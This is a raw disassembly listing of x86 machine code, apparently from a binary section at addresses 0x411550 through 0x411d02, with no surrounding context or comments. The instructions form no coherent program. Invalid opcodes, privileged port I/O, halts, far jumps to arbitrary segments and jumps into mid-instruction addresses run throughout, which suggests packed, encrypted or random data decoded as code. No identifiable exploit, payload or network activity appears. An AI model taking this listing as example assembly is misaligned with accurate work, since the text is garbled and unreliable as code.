  411550:	scas   eax,DWORD PTR es:[edi]
  411551:	add    eax,0xf79ed41f
  411556:	(bad)  
  411557:	push   ebx
  411558:	clc    
  411559:	sub    ebp,DWORD PTR [edx]
  41155b:	test   BYTE PTR [edi+0x35a5c7fb],bl
  411561:	pop    esp
  411562:	jno    0x41151b
  411564:	mov    al,ds:0xd6b0b83d
  411569:	mov    dl,0x63
  41156b:	enter  0x4c7f,0x40
  41156f:	lods   eax,DWORD PTR ds:[esi]
  411570:	pop    eax
  411571:	cwde   
  411572:	fdiv   QWORD PTR [eax-0x7a]
  411575:	sbb    DWORD PTR [edx+ecx*2],ecx
  411578:	out    0x2c,eax
  41157a:	inc    esi
  41157b:	cmc    
  41157c:	jecxz  0x411526
  41157e:	loope  0x411532
  411580:	push   es
  411581:	mov    ah,0x6a
  411583:	jecxz  0x411584
  411585:	inc    esp
  411586:	cmp    ch,BYTE PTR [eax+0x5c]
  411589:	and    al,0x7
  41158b:	mov    al,0x7f
  41158d:	mov    DWORD PTR [ebx-0x16],esp
  411590:	jbe    0x411516
  411592:	nop
  411593:	imul   esp,esi,0xa56186e4
  411599:	out    dx,eax
  41159a:	scas   al,BYTE PTR es:[edi]
  41159b:	inc    esi
  41159c:	xchg   edx,eax
  41159d:	xchg   ebp,eax
  41159e:	loopne 0x41160c
  4115a0:	sar    DWORD PTR ds:[eax+0x28],1
  4115a4:	and    eax,0xa9fd0e15
  4115a9:	aaa    
  4115aa:	out    dx,eax
  4115ab:	jge    0x41156a
  4115ad:	dec    edx
  4115ae:	mov    bh,0xb6
  4115b0:	pop    eax
  4115b1:	dec    edi
  4115b2:	xchg   BYTE PTR [edx+eiz*8+0x33],al
  4115b6:	pop    esi
  4115b7:	sbb    al,0x2a
  4115b9:	jo     0x411578
  4115bb:	sbb    DWORD PTR [ecx-0x30f686d2],ecx
  4115c1:	pop    edi
  4115c2:	ins    BYTE PTR es:[edi],dx
  4115c3:	popf   
  4115c4:	push   es
  4115c5:	pop    ss
  4115c6:	adc    edx,DWORD PTR [esi]
  4115c8:	add    edx,ebx
  4115ca:	mov    edx,DWORD PTR [ecx-0x29809310]
  4115d0:	ficom  DWORD PTR [edx-0x1ffb0f61]
  4115d6:	shl    DWORD PTR [eax-0x21],0x5c
  4115da:	mov    edi,DWORD PTR [edi]
  4115dc:	fsub   QWORD PTR [edx-0x47]
  4115df:	add    al,0x6e
  4115e1:	dec    edi
  4115e2:	hlt    
  4115e3:	sbb    dl,dh
  4115e5:	jp     0x41162f
  4115e7:	test   al,0xc3
  4115e9:	mov    DWORD PTR cs:[ebp+0x40],edi
  4115ed:	push   es
  4115ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115ef:	jecxz  0x4115e3
  4115f1:	int    0x2b
  4115f3:	stc    
  4115f4:	inc    esi
  4115f5:	sbb    al,BYTE PTR ds:0xcd65391b
  4115fb:	mov    ebx,0x5ac50773
  411600:	fcomp  st(3)
  411602:	das    
  411603:	(bad)  
  411604:	outs   dx,BYTE PTR ds:[esi]
  411605:	retf   0x8ad2
  411608:	aam    0x95
  41160a:	data16 jecxz 0x411609
  41160d:	mov    ds:0xc354326a,eax
  411612:	shl    edi,0x12
  411615:	mov    ecx,0xad25b973
  41161a:	mov    edx,0xaa3d04fb
  41161f:	int    0x54
  411621:	or     eax,0x9e294aae
  411626:	adc    al,ch
  411628:	xchg   esi,eax
  411629:	icebp  
  41162a:	ins    DWORD PTR es:[edi],dx
  41162b:	add    eax,ecx
  41162d:	mov    edx,0x269f177a
  411632:	cmp    dl,BYTE PTR ss:[ebp-0xd177f8f]
  411639:	cmp    DWORD PTR [ecx+0x1],ecx
  41163c:	mov    cl,0x2b
  41163e:	in     al,dx
  41163f:	retf   0xaeb6
  411642:	cmp    BYTE PTR [ecx+0x2545203d],ah
  411648:	ins    BYTE PTR es:[edi],dx
  411649:	(bad)  [ebx+0x62]
  41164c:	arpl   WORD PTR [esi-0x16],di
  41164f:	or     dh,cl
  411651:	inc    edi
  411652:	sub    ch,dh
  411654:	jo     0x4115dd
  411656:	int3   
  411657:	repz (bad) [eax+0x2cbb31cd]
  41165e:	int    0x8c
  411660:	and    DWORD PTR [eax+0xa725956],0xffffffb7
  411667:	popf   
  411668:	adc    ecx,DWORD PTR [eax-0x58]
  41166b:	inc    ebp
  41166c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41166d:	adc    DWORD PTR [esi+0x2e4c9f8],esi
  411673:	aaa    
  411674:	cdq    
  411675:	repnz or DWORD PTR [eax+0x41],0xed6071af
  41167d:	mov    esi,0x9209edd6
  411682:	add    ebp,DWORD PTR [ebp+0x25]
  411685:	aad    0x3f
  411687:	rol    DWORD PTR [esp+edx*2+0x63],1
  41168b:	inc    ebx
  41168c:	mov    di,es
  41168f:	sub    ah,BYTE PTR [edi]
  411691:	xor    al,BYTE PTR [ebx-0x2b]
  411694:	jle    0xaa01948d
  41169a:	jae    0x4116cf
  41169c:	lods   al,BYTE PTR ds:[esi]
  41169d:	imul   ecx,ecx,0xffffffea
  4116a0:	mov    bh,0x5f
  4116a2:	pusha  
  4116a3:	out    0x1d,al
  4116a5:	dec    esi
  4116a6:	dec    edx
  4116a7:	inc    ebp
  4116a8:	out    0xf8,al
  4116aa:	mov    ch,0xf2
  4116ac:	retf   0x57a0
  4116af:	dec    esi
  4116b0:	push   edx
  4116b1:	sti    
  4116b2:	rcr    esp,0x9c
  4116b5:	popf   
  4116b6:	push   ss
  4116b7:	jb     0x411717
  4116b9:	ja     0x4116a6
  4116bb:	(bad)  
  4116bc:	adc    esp,DWORD PTR [ecx]
  4116be:	jno    0x411704
  4116c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116c1:	sub    BYTE PTR [edi+0x71e38a0a],0x4a
  4116c8:	push   0x1c
  4116ca:	in     al,0x5e
  4116cc:	push   cs
  4116cd:	loopne 0x41174c
  4116cf:	in     al,0x3b
  4116d1:	sub    DWORD PTR [ebx-0x2dd42636],ebp
  4116d7:	xchg   edx,eax
  4116d8:	or     eax,0xa7bffb50
  4116dd:	xchg   edi,eax
  4116de:	out    0x87,eax
  4116e0:	push   esi
  4116e1:	mov    ecx,0x6efe9ff8
  4116e6:	mov    ebp,0x4e6e8a4c
  4116eb:	sar    DWORD PTR [edx],1
  4116ed:	retf   
  4116ee:	mov    al,ds:0xeb82abb4
  4116f3:	sbb    al,0x56
  4116f5:	dec    ebp
  4116f6:	or     al,0xa
  4116f8:	dec    eax
  4116f9:	jmp    0xc72f:0x7aa67f9f
  411700:	xchg   BYTE PTR [eax+0x50],ah
  411703:	add    bh,BYTE PTR [esi+0x5b]
  411706:	(bad)  [ebp+0x7ed73e7f]
  41170c:	aaa    
  41170d:	and    DWORD PTR [ebp+0x57],edx
  411710:	adc    edx,DWORD PTR [eax]
  411712:	jmp    0x20dfd1dd
  411717:	fcomp  DWORD PTR [eax]
  411719:	fidiv  DWORD PTR [esi]
  41171b:	inc    ebp
  41171c:	retf   0xde09
  41171f:	pop    ds
  411720:	test   BYTE PTR [esi*1+0x328625c6],0xa9
  411728:	loop   0x4116e2
  41172a:	xor    BYTE PTR [edi],bh
  41172c:	cmp    cl,BYTE PTR [ebx+eax*2-0x13]
  411730:	or     al,0x99
  411732:	in     eax,0x80
  411734:	inc    ecx
  411735:	popf   
  411736:	mov    eax,0xcb1b73e7
  41173b:	sti    
  41173c:	mov    edi,ss
  41173e:	ss cmp al,0x22
  411741:	jle    0x4117ae
  411743:	dec    ecx
  411744:	jge    0x411752
  411746:	shr    BYTE PTR [edi+0x56],cl
  411749:	pop    ss
  41174a:	ret    0x16ef
  41174d:	xchg   edx,eax
  41174e:	push   ebp
  41174f:	stos   DWORD PTR es:[edi],eax
  411750:	pop    ebp
  411751:	jecxz  0x411753
  411753:	out    dx,eax
  411754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411755:	fcom   DWORD PTR [ecx+0x63]
  411758:	jmp    0xf2f816af
  41175d:	add    ecx,DWORD PTR [ecx]
  41175f:	stc    
  411760:	mov    eax,0x493daee2
  411765:	scas   eax,DWORD PTR es:[edi]
  411766:	mov    BYTE PTR [eax-0xe0334a8],ah
  41176c:	mov    dl,0x8a
  41176e:	in     al,dx
  41176f:	arpl   WORD PTR [eax+edi*2+0x18],si
  411773:	cmp    eax,0xa0c72634
  411778:	push   ecx
  411779:	call   0x886d:0x612c8309
  411780:	das    
  411781:	fdiv   QWORD PTR [edi*2-0x2a033c28]
  411788:	mov    ds:0x3a273e07,eax
  41178d:	neg    DWORD PTR [esi+0x279df2dc]
  411793:	inc    ebx
  411794:	cld    
  411795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411796:	mov    ah,0xc8
  411798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411799:	test   DWORD PTR [ebp+0x1c],eax
  41179c:	jle    0x4117d7
  41179e:	push   eax
  41179f:	jae    0x411752
  4117a1:	jge    0x411770
  4117a3:	das    
  4117a4:	loopne 0x41176f
  4117a6:	inc    edi
  4117a7:	and    eax,0x15e4e635
  4117ac:	ja     0x411813
  4117ae:	cmp    al,0xe3
  4117b0:	mov    ebx,0xf8b5d6d4
  4117b5:	stos   WORD PTR es:[edi],ax
  4117b7:	dec    esp
  4117b8:	cmp    ah,BYTE PTR [esi-0x6d]
  4117bb:	sbb    eax,0x80091f43
  4117c0:	xor    BYTE PTR [edi],bh
  4117c2:	mov    ah,0xc5
  4117c4:	fist   WORD PTR [eax-0x21]
  4117c7:	and    DWORD PTR [edx-0x68e264f3],ebx
  4117cd:	outs   dx,DWORD PTR ds:[esi]
  4117ce:	and    al,0x35
  4117d0:	sbb    eax,0xbdc064ff
  4117d5:	addr16 adc al,0xfe
  4117d8:	jecxz  0x41184f
  4117da:	shr    DWORD PTR [edx+0x48],cl
  4117dd:	or     BYTE PTR [esi+0x36],ah
  4117e0:	sti    
  4117e1:	pop    ecx
  4117e2:	(bad)  
  4117e3:	mov    ebp,0x2d7e67f2
  4117e8:	dec    edi
  4117e9:	scas   al,BYTE PTR es:[edi]
  4117ea:	rcr    ch,1
  4117ec:	(bad)  
  4117ed:	(bad)  
  4117ee:	hlt    
  4117ef:	rcr    BYTE PTR [eax],0x15
  4117f2:	adc    al,0x38
  4117f4:	or     BYTE PTR [eax+0x7f7fa836],bh
  4117fa:	sub    al,0xc1
  4117fc:	mov    edx,0x73b4c963
  411801:	nop
  411802:	and    BYTE PTR [edi-0x16],bl
  411805:	inc    ebp
  411806:	mov    ss,WORD PTR [ecx]
  411808:	std    
  411809:	lea    ebx,[edx+eiz*1]
  41180c:	mov    edi,0x3e542385
  411811:	adc    BYTE PTR [esp+ebp*4-0x57aa30b7],al
  411818:	mov    ecx,0x220b5af9
  41181d:	cmp    DWORD PTR [ebx-0x46],eax
  411820:	xchg   edx,eax
  411821:	cmp    DWORD PTR [edx+0x76],esp
  411824:	cdq    
  411825:	add    dl,BYTE PTR [eax+eiz*1-0x3c]
  411829:	stos   BYTE PTR es:[edi],al
  41182a:	imul   edi,DWORD PTR [ecx-0x70],0xf
  41182e:	sbb    BYTE PTR [edx],ch
  411830:	sub    ebx,DWORD PTR [edx]
  411832:	les    edi,FWORD PTR [eax]
  411834:	lds    edx,FWORD PTR [edx]
  411836:	inc    esp
  411837:	rcl    BYTE PTR [ecx+ecx*1-0x2e],cl
  41183b:	cmp    al,0xbe
  41183d:	iret   
  41183e:	sbb    ebx,DWORD PTR [esi]
  411840:	ss jb  0x411879
  411843:	fadd   DWORD PTR [edi+0x47c44ecc]
  411849:	mov    ebp,DWORD PTR [edx]
  41184b:	ja     0x41189e
  41184d:	shl    edi,1
  41184f:	(bad)  
  411850:	jg     0x411800
  411852:	xor    eax,0xf618a575
  411857:	jbe    0x4117f2
  411859:	bound  eax,QWORD PTR [eax+0x3e]
  41185c:	jecxz  0x41181f
  41185e:	aaa    
  41185f:	ficomp WORD PTR [edx+0x53]
  411862:	pop    edx
  411863:	mov    ds:0xcaf5fa71,eax
  411868:	fld    DWORD PTR [edx+eax*1+0x4b33ac84]
  41186f:	lds    ebp,FWORD PTR [edx+0x7a]
  411872:	test   eax,0xaa12743a
  411877:	outs   dx,BYTE PTR ds:[esi]
  411878:	mov    cl,0xb2
  41187a:	mov    bh,0xca
  41187c:	out    0x33,al
  41187e:	push   edi
  41187f:	sub    al,BYTE PTR [esi-0x70]
  411882:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411884:	out    0xf3,al
  411886:	jl     0x4118c8
  411888:	mov    cl,0xd0
  41188a:	imul   ecx,edi,0xffffffbd
  41188d:	push   ebx
  41188e:	xchg   esp,eax
  41188f:	xchg   edx,eax
  411890:	jmp    0x41185c
  411892:	mov    cl,0x61
  411894:	es retf 
  411896:	je     0x411908
  411898:	add    dl,BYTE PTR [esi-0x7ff2e8a8]
  41189e:	inc    esi
  41189f:	xchg   BYTE PTR [edx],dh
  4118a1:	or     eax,0x19f0c6ad
  4118a6:	sbb    al,0x5e
  4118a8:	or     esp,DWORD PTR [ecx]
  4118aa:	or     DWORD PTR [eax-0x50],edi
  4118ad:	xlat   BYTE PTR ds:[ebx]
  4118ae:	push   ebx
  4118af:	mov    ecx,0xab47bc9a
  4118b4:	push   esp
  4118b5:	mov    esi,0xded93fed
  4118ba:	sbb    BYTE PTR [ecx],ah
  4118bc:	retf   
  4118bd:	dec    esi
  4118be:	jge    0x411908
  4118c0:	push   ecx
  4118c1:	aas    
  4118c2:	inc    eax
  4118c3:	dec    ebp
  4118c4:	push   esi
  4118c5:	not    ebx
  4118c7:	add    eax,0x367385d4
  4118cc:	xor    DWORD PTR [ebx+0x64],0xffffffb5
  4118d0:	xchg   DWORD PTR [edi],ebx
  4118d2:	test   eax,0x69998c85
  4118d7:	out    0x3,eax
  4118d9:	sub    DWORD PTR [edi],0xffffffec
  4118dc:	jb     0x41195b
  4118de:	cdq    
  4118df:	xor    eax,0xd4e2c763
  4118e4:	aaa    
  4118e5:	cs inc esp
  4118e7:	ins    DWORD PTR es:[edi],dx
  4118e8:	push   ebx
  4118e9:	cwde   
  4118ea:	cmp    ch,BYTE PTR [ebp-0x3f405d5]
  4118f0:	ins    DWORD PTR es:[edi],dx
  4118f1:	(bad)  
  4118f2:	outs   dx,DWORD PTR ds:[esi]
  4118f3:	xchg   edx,eax
  4118f4:	pop    es
  4118f5:	and    BYTE PTR [bx+0x12],al
  4118f9:	sbb    ecx,DWORD PTR [edx+eiz*4]
  4118fc:	inc    edx
  4118fd:	pop    edx
  4118fe:	retf   0xa085
  411901:	icebp  
  411902:	loopne 0x4118b7
  411904:	xchg   ebx,eax
  411905:	mov    cl,0x2f
  411907:	push   cs
  411908:	shl    BYTE PTR [ecx+esi*8+0x4f],0x87
  41190d:	jo     0x41190c
  41190f:	jmp    0x411977
  411911:	pop    ss
  411912:	hlt    
  411913:	sahf   
  411914:	imul   esi,ecx,0xffffff92
  411917:	xchg   esi,eax
  411918:	mov    ecx,0x5a05758d
  41191d:	mov    esi,DWORD PTR [esi]
  41191f:	add    al,0x13
  411921:	and    BYTE PTR [eax+0x6072566a],dh
  411927:	and    DWORD PTR [ecx],0xffffff8a
  41192a:	inc    ebp
  41192b:	add    BYTE PTR [edi+0x29],0x8
  41192f:	out    0x45,eax
  411931:	xchg   ecx,eax
  411932:	mov    cl,0x93
  411934:	mov    ebp,0xd03ac763
  411939:	push   eax
  41193a:	mov    bl,0x83
  41193c:	loop   0x411970
  41193e:	inc    ecx
  41193f:	data16 aas 
  411941:	cwde   
  411942:	pop    esp
  411943:	ins    DWORD PTR es:[edi],dx
  411944:	mov    BYTE PTR [edi+0x58656a3c],ah
  41194a:	ret    0x83fd
  41194d:	fs enter 0x45e6,0x5b
  411952:	adc    esp,esp
  411954:	xchg   DWORD PTR [edx+0x38],ecx
  411957:	(bad)  
  411958:	sub    BYTE PTR [esi+0x1211d420],al
  41195e:	dec    edx
  41195f:	hlt    
  411960:	mov    bl,BYTE PTR [esi-0x9]
  411963:	sbb    esp,DWORD PTR [eax]
  411965:	ja     0x41192d
  411967:	mov    esi,DWORD PTR [ebx+eiz*8+0x77]
  41196b:	addr16 adc esi,0x3d
  41196f:	into   
  411970:	jge    0x41195a
  411972:	push   edx
  411973:	ja     0x4118fd
  411975:	inc    ebx
  411976:	pop    ds
  411977:	pcmpeqw mm2,mm5
  41197a:	repnz or al,0x2a
  41197d:	push   ecx
  41197e:	ret    
  41197f:	pop    edi
  411980:	dec    eax
  411981:	gs iret 
  411983:	fwait
  411984:	cmp    eax,0x4ed585dd
  411989:	or     DWORD PTR [ecx+ecx*4-0xcab3502],edx
  411990:	and    dh,dh
  411992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411993:	mov    ah,0x6d
  411995:	retf   0xea9f
  411998:	loop   0x4119cb
  41199a:	shr    DWORD PTR [edx+0x6d],0x73
  41199e:	sar    DWORD PTR [ebx],0xc5
  4119a1:	mov    edx,0xe2736575
  4119a6:	and    BYTE PTR [eax+0x5ea6474d],dh
  4119ac:	mov    ds:0x987cef11,al
  4119b1:	inc    ecx
  4119b2:	jge    0x411a0b
  4119b4:	xor    BYTE PTR [edi-0x14],ah
  4119b7:	jo     0x4119e0
  4119b9:	imul   ebp,eax,0x179b0229
  4119bf:	or     ecx,DWORD PTR [esi+esi*1-0xb]
  4119c3:	sbb    al,0xe2
  4119c5:	and    ebp,esp
  4119c7:	(bad)  
  4119c8:	fwait
  4119c9:	scas   al,BYTE PTR es:[edi]
  4119ca:	sbb    DWORD PTR [ebp+0x55],ecx
  4119cd:	mov    eax,ds:0xe7935f3e
  4119d2:	test   DWORD PTR [ecx-0x6cf0c357],0x663e04cc
  4119dc:	sub    ch,BYTE PTR [ebp+0x4e8f66cf]
  4119e2:	imul   edi,edx,0x79fe7e15
  4119e8:	sbb    bl,BYTE PTR [ecx]
  4119ea:	inc    edx
  4119eb:	call   0xd884:0x30154089
  4119f2:	nop
  4119f3:	arpl   ax,ax
  4119f5:	shr    DWORD PTR [ebp-0x6153bcaf],cl
  4119fb:	sar    BYTE PTR [edx+eiz*4+0x7b74fae2],0x6a
  411a03:	int    0xbe
  411a05:	inc    edx
  411a06:	les    eax,FWORD PTR [ecx-0x4d]
  411a09:	icebp  
  411a0a:	and    WORD PTR [edi-0x3e],si
  411a0e:	in     al,0x67
  411a10:	leave  
  411a11:	sbb    edi,esp
  411a13:	out    dx,al
  411a14:	mov    al,0xa2
  411a16:	or     ebx,DWORD PTR [ecx+0x2fc187af]
  411a1c:	or     ah,dh
  411a1e:	mov    esi,0xca9af95f
  411a23:	scas   al,BYTE PTR es:[edi]
  411a24:	inc    ecx
  411a25:	scas   al,BYTE PTR es:[edi]
  411a26:	inc    ebp
  411a27:	mov    ebp,esp
  411a29:	leave  
  411a2a:	mov    bh,0x24
  411a2c:	into   
  411a2d:	mov    eax,ds:0x89c44d1e
  411a32:	ficomp WORD PTR [ebp+0x63]
  411a35:	ds push cs
  411a37:	cmp    BYTE PTR [edx],dh
  411a39:	mov    ebp,0x7ca01675
  411a3e:	enter  0x867a,0xef
  411a42:	gs stos BYTE PTR es:[edi],al
  411a44:	lods   al,BYTE PTR ds:[esi]
  411a45:	sahf   
  411a46:	pusha  
  411a47:	sti    
  411a48:	push   ebp
  411a49:	and    al,0x68
  411a4b:	sub    eax,0x417795b9
  411a50:	add    eax,0x212d243f
  411a55:	xchg   BYTE PTR [ebx+eax*8-0xc4033d1],ah
  411a5c:	loope  0x411a02
  411a5e:	es mov ebx,0x4af5f8eb
  411a64:	imul   ebx,DWORD PTR [eax-0x49d4739e],0x33
  411a6b:	repnz lods al,BYTE PTR ds:[esi]
  411a6d:	push   edx
  411a6e:	rcl    BYTE PTR [edx],1
  411a70:	out    dx,al
  411a71:	rol    ebp,0x53
  411a74:	or     bh,BYTE PTR ds:0xf58f428a
  411a7a:	jmp    0x411ae6
  411a7c:	mov    ebp,0xcdef06d5
  411a81:	icebp  
  411a82:	lods   eax,DWORD PTR ds:[esi]
  411a83:	and    DWORD PTR [ecx+0x49bf7636],0xffffffbc
  411a8a:	ja     0x411ab3
  411a8c:	jecxz  0x411aff
  411a8e:	mov    cl,0xf2
  411a90:	outs   dx,BYTE PTR ds:[esi]
  411a91:	mov    ds:0xf8ab38b,al
  411a96:	dec    esi
  411a97:	in     eax,dx
  411a98:	cld    
  411a99:	inc    ecx
  411a9a:	inc    eax
  411a9b:	arpl   WORD PTR [edx],di
  411a9d:	arpl   WORD PTR [edx-0x29f2174a],si
  411aa3:	bound  eax,QWORD PTR [edi]
  411aa5:	loope  0x411aa1
  411aa7:	xchg   esi,eax
  411aa8:	push   esp
  411aa9:	gs sahf 
  411aab:	fimul  DWORD PTR [edx-0x7e032b8c]
  411ab1:	and    dh,BYTE PTR [ebx]
  411ab3:	cld    
  411ab4:	add    BYTE PTR [ecx],bh
  411ab6:	shr    BYTE PTR [ecx+0x6d6c11bc],0x29
  411abd:	mov    edx,0x24133474
  411ac2:	lahf   
  411ac3:	dec    edi
  411ac4:	js     0x411af7
  411ac6:	inc    edi
  411ac7:	loop   0x411afa
  411ac9:	test   DWORD PTR [ebx-0x2575e77],edx
  411acf:	xor    ah,BYTE PTR [edx-0x7b5bc1cd]
  411ad5:	fnstsw WORD PTR [ecx+0x25]
  411ad8:	fs cld 
  411ada:	dec    ecx
  411adb:	pusha  
  411adc:	xlat   BYTE PTR ds:[ebx]
  411add:	retf   0x8bed
  411ae0:	xchg   esp,eax
  411ae1:	xchg   ebp,eax
  411ae2:	xor    DWORD PTR [eax-0x33],esp
  411ae5:	les    edi,FWORD PTR [esi+0x46]
  411ae8:	in     al,dx
  411ae9:	out    0xda,al
  411aeb:	repnz cmp edx,ebx
  411aee:	rcr    ebx,1
  411af0:	xchg   ecx,eax
  411af1:	xchg   DWORD PTR [ebx],esi
  411af3:	pop    ebx
  411af4:	sub    dh,ch
  411af6:	xchg   DWORD PTR [edi-0x58],esp
  411af9:	rol    esi,cl
  411afb:	mov    WORD PTR [ecx],ds
  411afd:	mov    edx,0x7ad7a717
  411b02:	ds push ebp
  411b04:	outs   dx,BYTE PTR ds:[esi]
  411b05:	les    esi,FWORD PTR [eax+0x6cf1dbde]
  411b0b:	xchg   DWORD PTR [ebp+0x2f],edi
  411b0e:	ins    DWORD PTR es:[edi],dx
  411b0f:	ja     0x411b72
  411b11:	mov    DWORD PTR [eax+0x76],esp
  411b14:	pop    es
  411b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b16:	xchg   esi,eax
  411b17:	push   0xe7122d1a
  411b1c:	aam    0xe7
  411b1e:	mov    dl,0xa
  411b20:	push   ebx
  411b21:	fcomp  QWORD PTR [eax+0x72]
  411b24:	push   ebx
  411b25:	repz retf 
  411b27:	imul   ebp,DWORD PTR [eax-0x61],0x777c64dd
  411b2e:	or     DWORD PTR ds:0xb25bfa7,esp
  411b34:	imul   ecx,DWORD PTR [edx],0xfffffffa
  411b37:	hlt    
  411b38:	pop    eax
  411b39:	push   esp
  411b3a:	push   ecx
  411b3b:	mov    eax,0x6621e7
  411b40:	sbb    bl,ch
  411b42:	ret    0x6c61
  411b45:	jle    0x411bc4
  411b47:	nop
  411b48:	pop    esp
  411b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b4a:	sbb    BYTE PTR [edx+0xe],ah
  411b4d:	jne    0x411bac
  411b4f:	hlt    
  411b50:	adc    ecx,DWORD PTR [ebx*1-0x40c8bd66]
  411b57:	jns    0x411b5f
  411b59:	shr    esp,1
  411b5b:	push   ecx
  411b5c:	cli    
  411b5d:	adc    bl,al
  411b5f:	mov    esi,0x43da2db3
  411b64:	push   ds
  411b65:	dec    ecx
  411b66:	ret    0x6c51
  411b69:	push   esp
  411b6a:	add    BYTE PTR [eax+esi*1+0x4596b5e],ch
  411b71:	ins    BYTE PTR es:[edi],dx
  411b72:	ficomp DWORD PTR [ebp-0x1f]
  411b75:	ficom  DWORD PTR [edx+0x2e96c02f]
  411b7b:	arpl   cx,cx
  411b7d:	pop    ebp
  411b7e:	(bad)
  411b81:	test   al,0xf2
  411b83:	dec    esi
  411b84:	pop    ds
  411b85:	push   ss
  411b86:	cmp    DWORD PTR [edi+edx*8-0x18],eax
  411b8a:	sub    eax,0xd8676028
  411b8f:	clc    
  411b90:	inc    ecx
  411b91:	or     al,0x26
  411b93:	mov    dl,0x3
  411b95:	jecxz  0x411b2a
  411b97:	call   0xf468:0x145b63a0
  411b9e:	sbb    BYTE PTR [edi+eiz*4+0x60],ah
  411ba2:	add    dl,dh
  411ba4:	xchg   ecx,eax
  411ba5:	jge    0x411b7b
  411ba7:	retf   0xbeb0
  411baa:	fs popf 
  411bac:	xchg   ebp,eax
  411bad:	call   0x98b8c2b6
  411bb2:	jo     0x411bf9
  411bb4:	push   ds
  411bb5:	jg     0x411b83
  411bb7:	jno    0x411b97
  411bb9:	jbe    0x411b9b
  411bbb:	ins    DWORD PTR es:[edi],dx
  411bbc:	fsubrp st(5),st
  411bbe:	(bad)  
  411bbf:	es popf 
  411bc1:	ret    0x466b
  411bc4:	mov    ?,WORD PTR [edx+0x67]
  411bc7:	xchg   ebp,eax
  411bc8:	mov    esp,0x90a61e68
  411bcd:	cmp    ebx,DWORD PTR [ecx+esi*4+0x71]
  411bd1:	pop    ecx
  411bd2:	pop    es
  411bd3:	(bad)  
  411bd4:	xor    eax,0xd360dd1c
  411bd9:	jl     0x411c58
  411bdb:	push   ecx
  411bdc:	sbb    esp,ebx
  411bde:	inc    eax
  411bdf:	leave  
  411be0:	stc    
  411be1:	mov    ds:0xceba74e,al
  411be6:	sbb    DWORD PTR [eax-0x4d],eax
  411be9:	add    eax,0xd9e96876
  411bee:	add    eax,0x5ac4b1d6
  411bf3:	xor    eax,0xc91872e4
  411bf8:	stos   BYTE PTR es:[edi],al
  411bf9:	pop    ss
  411bfa:	pop    di
  411bfc:	push   ss
  411bfd:	aas    
  411bfe:	rol    DWORD PTR [edi+0x44],1
  411c01:	inc    BYTE PTR ds:[ecx-0x200cf129]
  411c08:	inc    eax
  411c09:	inc    eax
  411c0a:	pcmpeqd mm2,QWORD PTR [esi-0x3]
  411c0e:	mov    al,0x69
  411c10:	stos   DWORD PTR es:[edi],eax
  411c11:	fldenv [edx-0x58bdf8e5]
  411c17:	pop    es
  411c18:	sub    ebx,DWORD PTR [esi-0xa36d2cb]
  411c1e:	jge    0x411c53
  411c20:	gs cmc 
  411c22:	mov    al,0x67
  411c24:	dec    ecx
  411c25:	out    0xbe,al
  411c27:	inc    ebp
  411c28:	sub    BYTE PTR [eax],0xa
  411c2b:	sbb    DWORD PTR [edi],ebp
  411c2d:	lods   al,BYTE PTR ds:[esi]
  411c2e:	rcr    DWORD PTR [ebp-0x45],0x70
  411c32:	data16 aas 
  411c34:	push   ecx
  411c35:	fdiv   DWORD PTR [edx-0x6f6b9510]
  411c3b:	shl    BYTE PTR [edi-0x3],1
  411c3e:	dec    edi
  411c3f:	add    DWORD PTR [ecx+ebx*1+0x5e807034],esp
  411c46:	stos   BYTE PTR es:[edi],al
  411c47:	mov    WORD PTR ds:0xc2db4970,?
  411c4d:	test   DWORD PTR [ebx-0x52],0xf4d54294
  411c54:	aas    
  411c55:	es mov dh,0xda
  411c58:	(bad)  
  411c59:	inc    cx
  411c5b:	sbb    dl,BYTE PTR [edx]
  411c5d:	xlat   BYTE PTR ds:[ebx]
  411c5e:	das    
  411c5f:	out    0x12,eax
  411c61:	sub    esi,DWORD PTR [ecx+0x117025e4]
  411c67:	cmc    
  411c68:	sbb    BYTE PTR ds:0x1803675e,dh
  411c6e:	sbb    eax,0xf57dc6cd
  411c73:	iret   
  411c74:	fadd   DWORD PTR [ebp+0x2c]
  411c77:	imul   esi,DWORD PTR [eax],0xc0f3bbb6
  411c7d:	mov    dh,BYTE PTR [esi+0x50ccf3ef]
  411c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c84:	fcomp  QWORD PTR [edx+ebx*8+0x8]
  411c88:	mov    dh,0xe6
  411c8a:	adc    BYTE PTR [ebx-0x5],al
  411c8d:	mov    bl,0xbd
  411c8f:	movlps QWORD PTR [esi-0x38],xmm7
  411c93:	in     al,0x99
  411c95:	in     eax,dx
  411c96:	push   ss
  411c97:	imul   edi,DWORD PTR [ebx+0x17072a05],0x9a43969e
  411ca1:	imul   BYTE PTR [edx-0x4e]
  411ca4:	les    esi,FWORD PTR ds:0x2d6db051
  411caa:	pop    ebx
  411cab:	call   0x70381146
  411cb0:	fidiv  DWORD PTR [ebx+0x2b]
  411cb3:	xchg   esi,eax
  411cb4:	or     al,0xa0
  411cb6:	test   BYTE PTR [ebx-0x24424b16],cl
  411cbc:	or     al,0x61
  411cbe:	sub    DWORD PTR [edx+0x1d],0x6c1b692
  411cc5:	push   edx
  411cc6:	xor    dl,bh
  411cc8:	pop    ds
  411cc9:	adc    bl,BYTE PTR [edx+0x4f0c9375]
  411ccf:	mov    cs,WORD PTR [ecx]
  411cd1:	es test cl,al
  411cd4:	xchg   BYTE PTR [esi+0x2f],ah
  411cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cd8:	pop    ebx
  411cd9:	retf   
  411cda:	mov    al,0x58
  411cdc:	out    0x61,al
  411cde:	rcl    DWORD PTR [edi-0x25471c94],1
  411ce4:	mov    eax,ds:0xd48aa6d0
  411ce9:	iret   
  411cea:	fstp   TBYTE PTR [ebx-0x2ed511d9]
  411cf0:	fiadd  WORD PTR [ecx-0x39a516bf]
  411cf6:	mov    edi,0x2c362cb6
  411cfb:	sbb    al,ah
  411cfd:	mov    al,ds:0x7396e1a9
  411d02:	daa    
